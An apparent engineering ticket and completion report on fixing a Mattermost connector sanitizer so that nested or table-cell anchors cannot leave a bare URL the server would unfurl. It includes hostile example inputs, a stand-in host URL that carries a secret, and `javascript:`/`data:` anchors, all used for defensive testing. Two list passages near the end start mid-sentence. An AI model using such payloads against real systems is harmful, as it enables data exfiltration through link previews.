# FIX-195: The Mattermost outbound pipeline leaves a nested `<a href>` inside a table cell (a live bare URL)

## Goal
This is security-relevant: link previews and data exfiltration (D-270; the outbound pipeline from FIX-142 and
FIX-182). The CI Watcher found it on 2026-11-20 in CI run 44731990142 (master 571548bd, shard rust-test 4):
`connectors/mattermost/tests/hostile_pipeline.rs:417` failed with "a bare URL is left (the server would fetch
it)". This is a new case after FIX-182.

Minimal input:

```
<a href="https://a.example"> |a|b|
|-|-|
|1|![x](u)| <a href="https://a.example">t</a> see https://e.example/?d=SECRET now </a>
```

Output:

```
|a|b|
|-|-|
|1|🖼 x| <a href="https://a.example">t</a> see [https://e.example/?d=SECRET](https://e.example/?d=SECRET) now
```

The outer anchor is removed, but the inner `<a href="https://a.example">t</a>` survives verbatim in a table
cell. Mattermost doesn't render HTML, so the URL in the attribute reaches the server as bare text and gets
unfurled.

The proptest seed is `cc 0bee1d64f95d04e972d251cd0e3eee62f9766c25e0bdb75685b0a6ee85a76f55`. Add it to
`connectors/mattermost/tests/hostile_pipeline.proptest-regressions` **in the same commit as the fix**: until the
fix lands, it fails CI at random.

## Change
1. Find out why the inner anchor is not converted. Likely causes:
   - the nested-anchor case: an `<a>` inside an `<a>` label that is converted as a document;
   - a table cell, where the HTML converter is not applied;
   - the outer anchor's label path from FIX-182, which converts the label differently.

   Confirm the actual cause in the Completion report.
2. Fix it where it lives, so that **every** `<a href>` in any position (nested, in a table cell, in a list, in a
   quote, in a heading) is converted or neutralised, the same as a top-level one. D-270's invariant must hold
   however the anchor is nested: "no bare `http(s)://` survives outside a closed code span".
3. Check the other HTML elements that carry a URL in an attribute (`<img src>`, `<iframe src>`, `<link href>`,
   `<area href>`, `<form action>`, and `<a href>` with `javascript:` and `data:` URLs) in the same nested and
   table positions.
4. Never weaken a check to make the property pass. The last line of defence, `is_safe`/`has_bare_url`, stays
   unchanged.

## Completion report

Lane E (`alexiri/p5-platform`), on master ab7460fe. No API change: no contract, no generated file. The brief has no
"which items wait" table, and nothing waits.

**Cause (confirmed): the third suspect, the label path, combined with the second.** The core read the CI input
as one paragraph. In it the first line `<a href> |a|b|` has three cells against the delimiter row's two, so it is
no table, and the core's own extra-cell escaping (`table_excess_edits`, FIX-142) had nothing to do. The outer
`<a>` pairs with the last `</a>`. The connector converted its label **as a document of its own**, with each line's
indentation trimmed (FIX-182). In that document `|a|b|` / `|-|-|` *is* a table, and the row `|1|🖼 x| <a …>t</a> see
[url](url) now ` has a third cell beyond the header's width. GFM drops such a cell, so the parser gives no event
for its content and the inner `<a href>` is never converted. Mattermost 11.7.15 renders the cell, so the URL in
the attribute reaches the server as text. The label then held a link (`](`), so it was kept as it was. The same
"label read as a document" path had a second hole, which the 600-case run found right after the first fix:
`<a href> <details><summary>s</summary>b</details> see [url](url) now </a>`. The trimmed label starts with
`<details>`, which opens an HTML **block**. That block's text is escaped as typed (`Html::text`), so the core's
`[url](url)` became `\[url\]\(url\)`, a bare URL.

**Fix (`connectors/mattermost/src/convert.rs`, `crates/aurora-core/src/sanitize/safe.rs`).**
1. `convert` runs the core's extra-cell escaping (`aurora_core::sanitize::escape_table_excess`, newly public; it
   wraps the existing `table_excess_edits`) on **every text it parses** before parsing it: the post, an anchor's
   label and a footnote's text, at every level of recursion. The pipe that would start a dropped cell, and each
   pipe after it, is escaped, so that content is text of the row's last cell. Every raw tag in it is then an
   `InlineHtml` event that this pass replaces. The function is idempotent, and a table that fits its header is
   unchanged.
2. An anchor's label is converted the way the core read it, as **inline content of one paragraph**
   (`convert_label`). Its lines are joined with spaces into one line, behind a `.`. A `.` cannot start a block
   and, like the `>` of the opening tag, is punctuation to the inline rules. It is stripped afterwards; no edit can
   start at the first byte because that byte is text. The label can therefore open no block: no HTML block, table,
   quote, list, fence, heading or indented code. This also covers the FIX-182 case without the trim. A link
   label is also kept on one line (`<p>`, `<li>` and other converted breaks become spaces), so no blank line can
   cut `[label](href)` and leave `](href)` as text.
3. Hardening, which does not rely on the core: an `href` becomes a link destination only when its scheme is
   allowed (`allowed_link_scheme`: http, https, mailto). A `javascript:`/`data:` anchor keeps its label and loses
   its tags, both inline and in an HTML block.

`is_safe`/`has_bare_url` and every other check are unchanged.

**Why no fetchable URL can survive, in any nesting.** A URL can reach Mattermost as text from a raw tag in only
two ways: the converter never sees the tag as an event, or the converter turns a link into text. (a) The converter
replaces every `InlineHtml` event (`<a>` becomes a link or is dropped; code becomes a one-line span; every other
tag, `<img src>`, `<iframe src>`, `<link href>`, `<area href>`, `<form action>`, is dropped with its attributes).
It converts every `HtmlBlock` as text, where tags are dropped and an `<a>` becomes a link. The only raw HTML the
parser shows no event for, outside code, is in a table cell beyond the header's width, and item 1 removes those
cells before every parse. (b) The pieces converted on their own now have the structure the core saw: a label is
one inline line (item 2), and a footnote's text was already flattened to one line at the position of the
definition's first block. So no conversion escapes the core's `[url](url)` into text. A link label is one line, so
no block break splits a link. (c) Nesting does not change this. Every nested anchor sits inside a label, and the
label is converted by the same `convert` (items 1–2 apply recursively). A quote, list item or heading is
ordinary inline content of the post. An HTML `<table>`, `<li>` or `<blockquote>` goes through the textual HTML
converter. (d) Unchanged, the last line `is_safe`/`has_bare_url` still checks every output. The property test
states D-270's invariant however the output came about, and it passed 20 000 cases (release) after all fixes.

**Third finding (pre-existing, the core; option A per the Orchestrator).** The 600-case run also found
`[x][r]\n\n[r]: https://e.example/ ( ftp://e.example/x and <www.e.example/y> )`. No HTML is involved and the
converter makes no edit. The bare `ftp://` and `www.` URLs are in a reference definition's **title**. The parser
gives a definition no event, so none of the core's rewrites reached it. **Rule applied (`def_title_edits`, in the
core's `rewrite`):** a definition's title that holds a preview URL (`http(s)://`, `ftp://`, `www.`, so also an
autolink `<…>` of one) is dropped, together with the whitespace or line break in front of it. The label and the
destination stay as they are, and a title without such a URL stays. A title is never displayed. Definitions are
found as the text that no event covers (container markers aside), read with the connector re-check's own
`[label]: dest` reading. So a **repeated** label is found too; the parser's `reference_definitions()` keeps only
the first definition of a label. A definition look-alike in prose (`para\n[r]: …`) is still broken at its colon
as before (it is covered by a text event, so it is not cut). A definition's destination is neutralised as today:
it is a link target, and the core and the re-check treat it unchanged. The seed (`cc 76b6e3b2…`) is committed.

  `<link href>`, `<area href>`, `<form action>`). Each is checked in 14 positions: nested in an anchor, in an anchor
  inside an anchor, in a table cell within and beyond the header's width (with and without outer pipes), in the
  CI shape of a table inside an anchor's label (also in a quote), in a list item, quote, heading, footnote,
  `<div>` and HTML `<td>`. There are also 4 container shapes × 11 block starters inside a label (HTML block, `<p>`,
  heading, quote, list, ordered list, fence, table with an extra cell, definition, indented code), a footnote that
  opens with `<details>`, and `<a>a <p> b</a>`. None leaves a bare URL or fails the last-line check. An ordinary
  top-level link is unchanged.

  titles, a title on the next line, in a quote, in a list item and on a repeated label, plus idempotence. It also
  checks that the destination is kept, that a title without a URL is kept (`"plain title"`, `(example.org is no URL)`)
  and that a prose look-alike is still broken.
